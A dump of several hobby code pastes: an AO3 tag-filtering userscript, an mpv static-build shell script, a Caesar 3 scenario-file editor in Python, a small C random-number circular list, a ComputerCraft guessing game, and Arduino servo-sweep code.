eed"":100,""repeatedPace"":true,""accountChart"":[""on"",""on"",""on"",""on""],""minWpm"":""off"",""minWpmCustomSpeed"":100,""highlightMode"":""letter"",""typingSpeedUnit"":""cpm"",""ads"":""result"",""hideExtraLetters"":false,""strictSpace"":true,""minAcc"":""off"",""minAccCustom"":90,""monkey"":false,""repeatQuotes"":""off"",""oppositeShiftMode"":""off"",""customBackground"":"""",""customBackgroundSize"":""cover"",""customBackgroundFilter"":[0,1,1,1,1],""customLayoutfluid"":""qwerty#dvorak#colemak"",""monkeyPowerLevel"":""off"",""minBurst"":""off"",""minBurstCustomSpeed"":100,""burstHeatmap"":false,""britishEnglish"":false,""lazyMode"":false,""showAverage"":""speed"",""tapeMode"":""off"",""maxLineWidth"":0}"
7k1btJzc,AO3 Primary Pairing - espa√±ol,Kaanbaltlak,JavaScript,Tuesday 2nd of July 2024 05:24:56 PM CDT,"// ==UserScript==
// @name         Ao3 Only Show Primary Pairing
// @namespace    https://greasyfork.org/en/users/36620
// @version      1
// @description  Hides works where specified pairing isn't the first listed.
// @author       Modified by Neeve, originally by scriptfairy
// @include      http://archiveofourown.org/*
// @include      https://archiveofourown.org/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/377386/Ao3%20Only%20Show%20Primary%20Pairing.user.js
// @updateURL https://update.greasyfork.org/scripts/377386/Ao3%20Only%20Show%20Primary%20Pairing.meta.js
// ==/UserScript==

/* CONFIG
   keep a plaintext file of your config because they will not be saved when the script updates */

 
var relationships = ['Kakyoin Noriaki/Kujo Jotaro', 'Hobie Brown/Pavitr Prabhakar', 'Tiz Arrior/Ringabel', 'Cindy Moon/Peter Parker'];
// the relationship tag you want to see (exact, case-sensitive). replace with your desired pairing.

var characters = ['Pavitr Prabhakar'];
// the character tags you want to see (exact, case-sensitive) - - ignore this

var relpad = 1;
// you want to see at least one of your relationships within this many relationship tags

var charpad = 5;
// you want to see at least one of your characters within this many character tags

/* END CONFIG */

(function($) {
    $('<style>').text(
        '.workhide{border:1px solid rgb(221,221,221);margin:0.643em 0em;padding:0.429em 0.75em;height:29px;} .workhide .left{float:left;padding-top:5px;} .workhide .right{float:right}'
    ).appendTo($('head'));
    if (relationships.length === 0 && characters.length === 0) {return;}
    var checkfandom = document.createElement('div');
    var fandomlink = $('h2.heading a')[0].href;
    fandomlink = fandomlink.slice(fandomlink.indexOf('tags'));
    $(checkfandom).load('/'+fandomlink+' .parent', function(){
        if ($('ul', checkfandom).text() == ""No Fandom"") {return;}
        else {
            for(i=0;i<$('.index .blurb').length;i++){
                var tags = $('.index .blurb ul.tags')[i];
                var reltags = $('.relationships', tags).slice(0,relpad); var chartags = $('.characters', tags).slice(0,charpad);
                var temprel = []; var tempchar = [];
                $(reltags).map(function() {
                    temprel.push(this.innerText);
                });
                $(chartags).map(function() {
                    tempchar.push(this.innerText);
                });
                var relmatch = temprel.filter(function(n) {
                    return relationships.indexOf(n) != -1;
                });
                var charmatch = tempchar.filter(function(n) {
                    return characters.indexOf(n) != -1;
                });
                if (relmatch.length === 0 && charmatch.length === 0) {
                    var work = $('.index .blurb')[i];
                    work.style.display = 'none';
                    var button = document.createElement('div');
                    button.setAttribute('class','workhide');
                    button.innerHTML = '<div class=""left"">Este trabajo no da prioridad a sus etiquetas preferidas.</div><div class=""right""><button type=""button"" class=""showwork"">Mostrar</button></div>';
                    $(work).after(button);
                }
            }
            $(document).ready(function(){
                $('.showwork').click(function() {
                    var blurb = $(this).parents('.workhide').prev()[0];
                    $(blurb).removeAttr('style');
                    $(this).parents('.workhide').remove();
                });
            });
        }
    });


})(window.jQuery);"
YB6vL5cN,do-mpv.sh - build script for a static mpv binary,pintcat,Bash,Tuesday 2nd of July 2024 05:20:59 PM CDT,"#!/bin/sh

# Dependencies: meson ninja-build yasm autoconf autoconf-archive libtool pkgconf pkg-config python3-docutils spirv-cross wayland-protocols debhelper-compat\ libfreetype-dev libfribidi-dev libharfbuzz-dev libfontconfig-dev libjpeg-dev libx11-dev libarchive-dev libasound2-dev libass-dev libavcodec-dev libavdevice-dev libavfilter-dev libavformat-dev libavutil-dev libbluray-dev libcaca-dev libcdio-dev libcdio-paranoia-dev libdrm-dev libdvdnav-dev libegl-dev libffmpeg-nvenc-dev libgbm-dev libgl-dev libjack-dev liblcms2-dev liblua5.2-dev libmujs-dev libpipewire-0.3-dev libplacebo-dev libpulse-dev librubberband-dev libsdl2-dev libsixel-dev libspirv-cross-c-shared-dev libswscale-dev libuchardet-dev libva-dev libvdpau-dev libvulkan-dev libwayland-dev libxinerama-dev libxkbcommon-dev libxpresent-dev libxrandr-dev libxss-dev libxv-dev libzimg-dev

TMP_DIR=""/media/ramdisk/mpv-build""
BIN_DIR=""/home/pintcat/ubin""

CLEAN(){
	printf ""\n\033[0;32mCleaning up... ""
	cd $TMP_DIR/..
	rm -rf $TMP_DIR
	printf ""done.\033[0m\n""
}

FAIL(){
	printf ""\n\033[0;31mError - $1 :(\033[0m\n""
	CLEAN
	exit 1
}

if [ -d ""$TMP_DIR"" ]; then
	printf ""\n\033[0;32mFolder \""""$TMP_DIR""\"" already exists and it's content will be deleted. Continue (Y/n)? \033[0m""
	read YN
	case $YN in
		n|N)
			printf ""\n\033[0;32mDone - nothing changed.\033[0m\n\n""
			exit
			;;
		*)
			CLEAN
			;;
	esac
fi
printf ""\n\033[0;32mDownloading build scripts...\033[0m\n\n""
if git clone https://github.com/mpv-player/mpv-build.git $TMP_DIR; then
	printf ""\n\033[0;32mDownloading and building components and linking final binary...\033[0m\n\n""
	cd $TMP_DIR
	./use-ffmpeg-release
	printf ""--disable-avisynth\n--enable-nonfree\n--enable-version3\n--enable-static\n--enable-runtime-cpudetect"" >> ffmpeg_options
#	printf ""--Dcdda=enabled\n--Ddvdnav=enabled\n--Dsdl2=enabled"" >> mpv_options
	if ./rebuild -j$(grep -m 1 ""siblings"" /proc/cpuinfo | awk '{print $3}'); then
   		printf ""\n\033[0;32mCompressing and installing binary to \""$BIN_DIR\"".\033[0m\n\n""
		if [ -f ""$BIN_DIR/mpv~"" ]; then rm -f $BIN_DIR/mpv~; fi
		if [ -f ""$BIN_DIR/mpv"" ]; then mv $BIN_DIR/mpv $BIN_DIR/mpv~; fi
		upx --lzma -9 mpv/build/mpv -o $BIN_DIR/mpv
		CLEAN
	else
		FAIL ""building mpv binary failed.""
	fi
else
	FAIL ""unable to obtain source.""
fi
echo
"
bY6TQfeH,C3 Pilgrim's Bastion script,7Soul,Python,Tuesday 2nd of July 2024 05:17:05 PM CDT,"import mmap
import math
import sys, getopt

our_city = ""Tingis""

terrain_offset = 0x2009B

def writeLong(value, len):
	return (value).to_bytes(len,byteorder='little')

def writeShort(value, len):
	return (value).to_bytes(len,byteorder='big')

def getQuotaOffset(city, good):
	offset = partners_offset + (partners[city] * 0x40) + (goods[good] * 0x04)
	return offset 
	
def getCityOffset(city):
	offset = cities_offset + 0x03 # city name id
	# Check if we found the city, since they aren't in order
	for i in range(28): # 0 to 27
		offset += 66
		mm.seek(offset)
		if mm.read_byte() == cities[city]:
			break
		
	## then add 6 to get to buy flags (16 bytes) and then sell flags
	return offset
	
def setTradeRoutePrice(city, price):
	offset = getCityOffset(city) - 0x03 + 0x26
	mm.seek(offset)
	mm.write( writeLong(price, 2) )
	
def changeGoodsPrices(good, multi, type):
	# Type 0 = both, 1 = only buyers, 2 = only sellers
	offset = 0x125C3C
	mm.seek(offset)
	mm.seek(goods[good] * 0x08, 1)
	for i in range(2):
		if i == 0 and type == ""sellers"":
			mm.seek(4,1)
			continue
		if i == 1 and type == ""buyers"":
			continue
		price = math.floor(int(mm.read_byte()) * multi)
		mm.seek(-1,1)
		mm.write( writeLong(price, 4) )
		# print(mm.read_byte())
		
def setLocalProduction(good, value):
	offset = getCityOffset(our_city) # cur byte is after city name
	mm.seek(2 + 16, 1)
	mm.seek(goods[good], 1)
	mm.write_byte(value)

with open(""D:\Games\Caesar 3 Julius\Test.c3u"", ""r+b"") as f:
	# memory-map the file, size 0 means whole file
	mm = mmap.mmap(f.fileno(), 0)
	
	goods = {
		""wheat"":      0x01,
		""vegetables"": 0x02,
		""fruits"":     0x03,
		""olives"":     0x04,
		""vines"":      0x05,
		""meat"":       0x06,
		""wine"":       0x07,
		""oil"":        0x08,
		""iron"":       0x09,
		""timber"":     0x0A,
		""clay"":       0x0B,
		""marble"":     0x0C,
		""weapons"":    0x0D,
		""furniture"":  0x0E,
		""pottery"":    0x0F,
	}
	
	partners_offset = 0x131702
	partners = {
		""Carthago Nova""  : 0x01,
		""Caesarea""  : 0x02,
		""Volubilis"" : 0x03,
		""Valentia""  : 0x04,
		""Tarraco""   : 0x05,
	}
	
	cities_offset = 0x12516C
	cities = {
		""Roma"" : 0x00,
		""Tarentum"" : 0x01,
		""Capua"" : 0x02,
		""Brundisium"" : 0x03,
		""Mediolanum"" : 0x04,
		""Carthago Nova"" : 0x05,
		""Carthago"" : 0x06,
		""Tarraco"" : 0x07,
		""Athenae"" : 0x08,
		""Pergamum"" : 0x09,
		""Syracusae"" : 0x0A,
		""Toletum"" : 0x0B,
		""Tarsus"" : 0x0C,
		""Leptis Magna"" : 0x0D,
		""Tingis"" : 0x0E,
		""Corinthus"" : 0x0F,
		""Valentia"" : 0x10,
		""Lindum"" : 0x19,
		""Calleva"" : 0x1A,
		""Lutetia"" : 0x1B,
		""Caesarea"" : 0x1F,
		""Augusta Trevorum"" : 0x21,
		""Volubilis"" : 0x23,
		""Londinium"" : 0x24,
	}
	
	buildings = {
		""farms"" : 1,
	}
	
	opts, args = getopt.getopt(sys.argv[1:],""wf"")
	  
	for opt, arg in opts:
		if opt in ['-w']:
			print(""warehouse only"")
			# Erase cliff tiles
			eraseTiles = [0x24593, 0x26B37, 0x26317, 0x25F49, 0x28C0F, 0x29BD7]
			for pos in eraseTiles:
				mm.seek(pos)
				mm.write_byte(0x00)
		
			# Add marble to warehouse
			warehouse = 0xE695A
			mm.seek(warehouse) 
			mm.seek(0x0C,1)
			mm.write_byte(0x0C)
			mm.seek(warehouse) 
			mm.seek(0x34,1) 
			mm.write_byte(0x0C) # 12 marble in 1 tile why not
			
			# This replaces ramps with roads. Basically instead of a ramp being a 2x2 road, it becomes a 1x2 road
			rampscount = 0
			ramps = []
			mm.seek(terrain_offset) #2009B 
			# elevation: 59b40
			rampBot = ""0004""
			rampsBot = ""00040004""
			rampTop	= ""0006""
			rampsTop = ""00060006""
						
			mm.seek(terrain_offset-1)
			for i in range(int(162*162*2)):
				byte = mm.read(4)
				# find      bottom of stairs - bottom of stairs
				# turn into road - empty
				if byte.hex() == rampsBot:
					# print(byte)
					mm.seek(-4,1)
					# bytes have to be written swapped
					mm.write_byte(0x40)
					mm.write_byte(0x00)
					mm.write_byte(0x00)
					mm.write_byte(0x00)
					print(terrain_offset + (i*2))
					rampscount += 1
					print(""ramp"")
				mm.seek(-2,1)
			print(rampscount)
			
			mm.seek(terrain_offset-1)
			for i in range(int(162*162*2)):
				byte = mm.read(4)
				# find      top of stairs - top of stairs
				# turn into road w/elevation - elevation
				if byte.hex() == rampsTop:
					mm.seek(-4,1)
					# bytes have to be written swapped
					mm.write_byte(0x40)
					mm.write_byte(0x02)
					mm.write_byte(0x00)
					mm.write_byte(0x02)
					print(terrain_offset + (i*2))
					print(""ramp elevated"")
				mm.seek(-2,1)
				
			mm.seek(terrain_offset-1)
			for i in range(int(162*162*2)):
				byte = mm.read(4)
				# find      bottom of stairs - top of stairs
				# turn into road w/elevation - elevation
				if byte.hex() == ""00040006"":
					mm.seek(-4,1)
					mm.seek(324,1)
					byte = mm.read(2)
					# if the tile on the next row is also a ramp, this tile becomes just a hill
					if byte.hex() == rampBot or byte.hex() == rampTop:
						mm.seek(-2,1)
						mm.seek(-324,1)
						# bytes have to be written swapped
						mm.write_byte(0x00)
						mm.write_byte(0x00)
						mm.write_byte(0x00)
						mm.write_byte(0x02)
						print(""ramp low to high with other piece of ramp in next row"")
					else:
						mm.seek(-2,1)
						mm.seek(-324,1)
						# bytes have to be written swapped
						mm.write_byte(0x40)
						mm.write_byte(0x00)
						mm.write_byte(0x40)
						mm.write_byte(0x02)
						print(""ramp low to high with nothing next row"")
				mm.seek(-2,1)
				
			mm.seek(terrain_offset-1)
			for i in range(int(162*162*2)):
				byte = mm.read(4)
				if byte.hex() == ""00060004"":
					mm.seek(-4,1)
					mm.seek(324,1)
					byte = mm.read(2)
					# if the tile on the next row is also a ramp, this tile becomes just a hill
					if byte.hex() == rampTop or byte.hex() == rampBot:
						mm.seek(-2,1)
						mm.seek(-324,1)
						# bytes have to be written swapped
						mm.write_byte(0x40)
						mm.write_byte(0x02)
						mm.write_byte(0x40)
						mm.write_byte(0x00)
						print(""ramp high to low with other piece of ramp in next row"")
					else:
						mm.seek(-2,1)
						mm.seek(-324,1)
						# bytes have to be written swapped
						mm.write_byte(0x00)
						mm.write_byte(0x02)
						mm.write_byte(0x00)
						mm.write_byte(0x00)
						print(""ramp high to low with nothing next row"")
				mm.seek(-2,1)
				
			
				
			# print(""found %d ramps"" % rampscount)
		if opt == '-f':
			print(""finish"")
			
			# Reset money to 5k
			mm.seek(0xE218C)
			mm.write_byte(0x88)
			mm.write_byte(0x13)
			mm.seek(0xE4CFC)
			mm.write_byte(0x88)
			mm.write_byte(0x13)
			
			# Disable buildings
			mm.seek(0x126342) # Fort
			mm.write_byte(0x00)
			mm.seek(0x12634A) # Large Temple
			mm.write_byte(0x00)
			
			# Burn Mars large temple (build first after warehouse)
			mm.seek(0xE6D5B)
			mm.seek(0x3F, 1)
			mm.write_byte(0x64) # 100 fire rate
			
			# Sets the next 5 buildings to never burn or collapse
			mm.seek(0xE6D5A)
			mm.seek(0x44, 1)
			for n in range(5):
				mm.seek(0x80, 1)
				mm.write_byte(0x01)
				mm.seek(-1, 1)
			
			# Change favor to 35
			mm.seek(0xE6314)
			mm.write_byte(35)
			
			# Change savings to 1500
			mm.seek(0xE6450)
			mm.write_byte(0xDC)
			mm.write_byte(0x05)
			
			# Makes all goods 20% less profitable
			for g, h in goods.items():
				changeGoodsPrices(g, 1.0 + 0.20, ""buyers"")
				changeGoodsPrices(g, 1.0 - 0.20, ""sellers"")
	
	
	
	# Remove unwanted quotas
	mm.seek(getQuotaOffset(""Caesarea"", ""marble""))
	mm.write_byte(0x00)
	mm.seek(getQuotaOffset(""Carthago Nova"", ""timber""))
	mm.write_byte(0x00)
	mm.seek(getQuotaOffset(""Valentia"", ""timber""))
	mm.write_byte(0x00)
	mm.seek(getQuotaOffset(""Tarraco"", ""timber""))
	mm.write_byte(0x00)
	mm.seek(getQuotaOffset(""Volubilis"", ""iron""))
	mm.write_byte(0x0F)
	
	# changeGoodsPrices(""vegetables"", 1.20, ""both"")
	# changeGoodsPrices(""iron"", 0.875, ""both"")
	# changeGoodsPrices(""pottery"", 0.85, ""both"")
	# changeGoodsPrices(""marble"", 1.20, ""both"")
	# changeGoodsPrices(""furniture"", 0.75, ""both"")
	# changeGoodsPrices(""timber"", 0.5, ""sellers"")
	
	
	
	setTradeRoutePrice(""Carthago Nova"", 2100)
	setTradeRoutePrice(""Caesarea"", 800)
	setTradeRoutePrice(""Volubilis"", 2000)
	setTradeRoutePrice(""Valentia"", 900)
	setTradeRoutePrice(""Tarraco"", 2500)
	
	setLocalProduction(""timber"", 1)
	
	# close the map
	mm.close()
	"
JzDNVPcf,circular list,Kaelygon,C,Tuesday 2nd of July 2024 04:50:06 PM CDT,"// ./main > out.txt && grep -o ""$(head -c 10000 ./out.txt | tail -c 16)"" ./out.txt | wc -l
// ./main | dieharder -B -g 200 -a
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <stdint.h>
#include <limits.h>
#include <string.h>

typedef uint8_t cygonUI;


cygonUI cgRor(cygonUI num, cygonUI shift){
	cygonUI invShift=sizeof(num)*CHAR_BIT-shift;
	return ((num >> shift) | (num << invShift ));
}

typedef struct cygonNode{
	cygonUI num;
	struct cygonNode* next;
}cygonNode;

typedef struct cygonList{
	size_t bits; 		//bit width of cygonUI
	size_t size;
	cygonNode* node;	//list of nodes
	cygonNode** mem;	//Mallocated node list adresses
	
}cygonList;


void nextNode(cygonList* list) {
	list->node=list->node->next;
}

void cygonInit(cygonList* list, size_t nodeCount) {
    if (nodeCount < 1) {
        fprintf(stderr, ""List can't have 0 nodes! Using size 1\n"");
        nodeCount = 1;
    }
    
    list->bits = sizeof(cygonUI) * CHAR_BIT;
	list->size = nodeCount;
    list->node = (cygonNode*) malloc(sizeof(cygonNode) * nodeCount);
	list->mem = (cygonNode**) malloc(sizeof(cygonNode*) * nodeCount); // allocate node pointers

    if (list->node == NULL || list->mem == NULL) {
        fprintf(stderr, ""Memory allocation failed\n"");
        return;
    }

    // Link circular list
    for (size_t i = 0; i < nodeCount; ++i) {
		list->mem[i] = &list->node[i]; //Store mallocated address of node
        list->node[i].num = 0;
        list->node[i].next = &list->node[(i + 1) % nodeCount];
    }
}

void cygonFree(cygonList* list) {
	free(*list->mem);
	free(list->mem);
}

void cygonSeed(cygonList* list, cygonUI seed) {
	cygonNode* start = list->node; //store starting point

	do{ 
		list->node->num=seed;
		nextNode(list);
			
		{//placeholder
			seed++;
		}

	}while(list->node != start); //Reaching starting point means we have looped through circular list
}

cygonUI cygonRand(cygonList* list) {
	cygonUI a = list->node->num;
	cygonUI b = list->node->next->num;

	{//placeholder
		a++;
	}

	//update and increment circular list
	list->node->num=a;
	list->node=list->node->next; 

	return a;
}

//print all nodes
void cygonPrint(cygonList* list) {
	cygonNode* start = list->node;

	do{
		printf(""%u "",list->node->num);
		list->node=list->node->next;
	}while(list->node != start);
	printf(""\n"");
}

size_t randCountArg(int argc, char *argv) { 
	if (argc > 1) {
		if(!strcmp(argv,""default"")){
			return 512;
		}else{
			char isString=1;
			char *x = argv;
			while (*x) {
				if (!isdigit(*x)) {
					isString=0;
					break;
				}
				x++;
			}

			if(isString){ 
				return strtoul(argv, NULL, 10); 
			}
		}
	}else{
		return -1; //generate indefinitely 
	}
}

int main(int argc, char *argv[]) { 
	size_t count = randCountArg(argc, argv[1]);

	cygonList list;

	cygonInit(&list, 4);
	cygonSeed(&list, 0);

	for(size_t i=0;i<count;i++){
		cygonUI num = cygonRand(&list);
		//fwrite(&num, sizeof(cygonUI), 1, stdout); //write raw
		printf(""%u "",num);
	}
	printf(""\n"");

	cygonFree(&list);

	return 0;
}
"
2wiJMS2p,CC-Gambler,minecartchris,Lua,Tuesday 2nd of July 2024 04:43:10 PM CDT,"while not fs.exists(""/disk/money.lua"") do
    sleep(0.75)
    print(""You do not have a card inserted"")
    sleep(2)
    shell.run(""reboot"")
end
print(""Please do not remove your card from the drive during games"")
local money = "" ""
local winner = false
local randnum = 0
local bet = 0
local money2 = fs.open(""/disk/money.lua"", ""r"")
money = money2.readAll()
money2.close()
local h = fs.open(""house.lua"", ""r"")
house = h.readAll()
h.close()
print(""$"",money)
money = tonumber(money)
print(""what is your bet?"")
bet = tonumber(io.read())
print(""what is your guess 1 to 15?"")
userGess = tonumber(io.read()) 
if bet > money then
   print(""You do not have enough funds"")
   sleep(3)
   shell.run(""reboot"") 
end
randnum = tonumber(math.random(0, 14) + 1)
if userGess == randnum then
    winner = true
end
if not winner then
    print(""you lost ;("")
    print(""The correct number was"", randnum)
    money = money - bet
    house = house + bet
    print(""you have $"",money, ""left over"")
end
if winner then
    bet = bet * 2
    money = bet + money
    print(""You win!!!!!"")
    house = house - bet
    print(""You now have $"", money)
end
money2 = fs.open(""/disk/money.lua"", ""w"")
money2.write(money)
money2.close()
h = fs.open(""house.lua"", ""w"")
h.write(house)
h.close()
print(""If removing your card do it now"")
sleep(5)
shell.run(""reboot"")"
9bRC2d1f,Servo Sweep rev_01,pleasedontcode,Arduino,Tuesday 2nd of July 2024 04:42:46 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Servo Sweep
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-07-02 21:38:55

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Design an Arduino system to manage two SG90 */
	/* servomotors using PWM on pins D3 and D5. Leverage */
	/* the Servo and ArduinoLearningBoard libraries. */
	/* Include setup for pin initialization and a loop */
	/* function to handle continuous motor position */
	/* updates. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#define USE_ALB_Servo  // Define to include the Servo functions of the ArduinoLearningBoard Library
#include ""ArduinoLearningBoard.h""  // Include the main ArduinoLearningBoard library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF PWM OUTPUT PINS *****/
const uint8_t sg90_Servomotor_PWMSignal_PIN_D3 = 3;
const uint8_t sg90_Servomotor_PWMSignal_PIN_D5 = 5;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
uint8_t sg90_Servomotor_PWMSignal_PIN_D3_rawData = 0;
uint8_t sg90_Servomotor_PWMSignal_PIN_D5_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float sg90_Servomotor_PWMSignal_PIN_D3_phyData = 0.0;
float sg90_Servomotor_PWMSignal_PIN_D5_phyData = 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Servo servo1;  // Create a Servo object for the first servo
Servo servo2;  // Create a Servo object for the second servo

void setup(void)
{
  // put your setup code here, to run once:

  pinMode(sg90_Servomotor_PWMSignal_PIN_D3, OUTPUT);
  pinMode(sg90_Servomotor_PWMSignal_PIN_D5, OUTPUT);

  servo1.attach(sg90_Servomotor_PWMSignal_PIN_D3);  // Attach the first servo to pin D3
  servo2.attach(sg90_Servomotor_PWMSignal_PIN_D5);  // Attach the second servo to pin D5
}

void loop(void)
{
  // put your main code here, to run repeatedly:

  // Sweep the first servo
  for (int pos = 0; pos <= 180; pos += 1) {
    servo1.write(pos);  // Move the first servo to the current position
    delay(15);  // Wait for 15 milliseconds
  }
  for (int pos = 180; pos >= 0; pos -= 1) {
    servo1.write(pos);  // Move the first servo to the current position
    delay(15);  // Wait for 15 milliseconds
  }

  // Sweep the second servo
  for (int pos = 0; pos <= 180; pos += 1) {
    servo2.write(pos);  // Move the second servo to the current position
    delay(15);  // Wait for 15 milliseconds
  }
  for (int pos = 180; pos >= 0; pos -= 1) {
    servo2.write(pos);  // Move the second servo to the current position
    delay(15);  // Wait for 15 milliseconds
  }
}

/* END CODE */"
